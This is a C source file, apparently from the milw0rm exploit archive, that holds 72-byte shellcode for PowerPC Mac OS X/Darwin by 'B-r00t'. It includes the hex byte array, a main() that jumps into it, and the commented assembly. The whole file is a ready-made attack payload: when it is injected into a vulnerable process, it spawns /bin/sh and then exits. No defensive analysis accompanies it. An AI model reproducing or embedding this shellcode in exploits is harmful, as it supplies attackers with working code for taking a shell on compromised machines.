/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does execve(/bin/sh); exit(0);
See ASM below.
72 Bytes.
*/

char shellcode[] =
"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
"\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
"\x39\x40\x01\x70\x39\x1f\xfe\xcf"
"\x7c\xa8\x29\xae\x38\x7f\xfe\xc8"
"\x90\x61\xff\xf8\x90\xa1\xff\xfc"
"\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
"\x44\xff\xff\x02\x7c\xa3\x2b\x78"
"\x38\x0a\xfe\x91\x44\xff\xff\x02"
"\x2f\x62\x69\x6e\x2f\x73\x68\x58";

int main (void)
{
        __asm__("b _shellcode");
}


/*
; PPC OS X / Darwin Shellcode by B-r00t.
; execve(/bin/sh) exit(0)
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main
        mflr    r11
        addi    r31, r11, 368
        li      r10, 368
        addi    r8, r31, -305
        stbx    r5, r8, r5
        addi    r3, r31, -312
        stw     r3, -8(r1)
        stw     r5, -4(r1)
        subi    r4, r1, 8
        addi    r0, r10, -309
        .long   0x44ffff02
        mr      r3, r5
        addi    r0, r10, -367
        .long   0x44ffff02
path:   .asciz  "/bin/shX"

*/

// milw0rm.com [2004-09-26]